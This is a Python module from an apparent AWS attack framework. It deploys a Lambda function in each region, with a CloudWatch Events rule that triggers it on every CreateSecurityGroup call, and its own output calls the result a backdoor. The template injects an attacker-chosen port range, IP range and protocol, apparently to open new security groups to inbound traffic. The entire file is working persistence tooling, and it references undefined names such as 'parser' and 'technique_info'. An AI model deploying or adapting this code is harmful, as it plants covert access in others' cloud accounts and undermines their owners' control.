#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess
import random
import string
import os

def main(args, awsattack_main):
    session = awsattack_main.get_active_session()

    args = parser.parse_args(args)
    print = awsattack_main.print
    get_regions = awsattack_main.get_regions

    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}

    created_resources = {'LambdaFunctions': [], 'CWERules': []}

    if not args.regions:
        regions = get_regions('Lambda')
    else:
        regions = args.regions.split(',')

    from_port, to_port = args.port_range.split('-')

    target_role_arn = args.target_role_arn

    # Import the Lambda function and modify the variables it needs
    with open('./modules/{}/lambda_function.py.bak'.format(technique_info['name']), 'r') as f:
        code = f.read()

    code = code.replace('FROM_PORT', from_port).replace('TO_PORT', to_port).replace('IP_RANGE', args.ip_range).replace('IP_PROTOCOL', args.protocol)

    with open('./modules/{}/lambda_function.py'.format(technique_info['name']), 'w+') as f:
        f.write(code)

    # Zip the Lambda function
    try:
        print('  Zipping the Lambda function...\n')
        subprocess.run('cd ./modules/{}/ && rm -f lambda_function.zip && zip lambda_function.zip lambda_function.py && cd ../../'.format(technique_info['name']), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as error:
        print('Failed to zip the Lambda function locally: {}\n'.format(error))
        return data

    with open('./modules/{}/lambda_function.zip'.format(technique_info['name']), 'rb') as f:
        zip_file_bytes = f.read()

    for region in regions:
        print('Starting region {}...'.format(region))
        client = awsattack_main.get_boto3_client('lambda', region)

        try:
            function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
            response = client.create_function(
                FunctionName=function_name,
                Runtime='python3.6',
                Role=target_role_arn,
                Handler='lambda_function.lambda_handler',
                Code={
                    'ZipFile': zip_file_bytes
                }
            )
            lambda_arn = response['FunctionArn']
            print('  Created Lambda function: {}'.format(function_name))
            data['functions_created'] += 1
            created_resources['LambdaFunctions'].append('{}@{}'.format(function_name, region))

            client = awsattack_main.get_boto3_client('events', region)

            response = client.put_rule(
                Name=function_name,
                EventPattern='{"source":["aws.ec2"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["ec2.amazonaws.com"],"eventName":["CreateSecurityGroup"]}}',
                State='ENABLED'
            )
            print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
            data['rules_created'] += 1

            client = awsattack_main.get_boto3_client('lambda', region)

            client.add_permission(
                FunctionName=function_name,
                StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
                Action='lambda:InvokeFunction',
                Principal='events.amazonaws.com',
                SourceArn=response['RuleArn']
            )

            client = awsattack_main.get_boto3_client('events', region)

            response = client.put_targets(
                Rule=function_name,
                Targets=[
                    {
                        'Id': '0',
                        'Arn': lambda_arn
                    }
                ]
            )
            if response['FailedEntryCount'] > 0:
                print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
                print(response['FailedEntries'])
            else:
                print('  Added Lambda target to CloudWatch Events rule.')
                data['successes'] += 1
                created_resources['CWERules'].append('{}@{}'.format(function_name, region))
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDeniedException':
                print('  FAILURE: MISSING NEEDED PERMISSIONS')
            else:
                print(code)

    if created_resources['LambdaFunctions']:
        with open('./modules/{}/created-lambda-functions.txt'.format(technique_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['LambdaFunctions']))
    if created_resources['CWERules']:
        with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(technique_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['CWERules']))

    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in the region it was deployed to.')

    return data


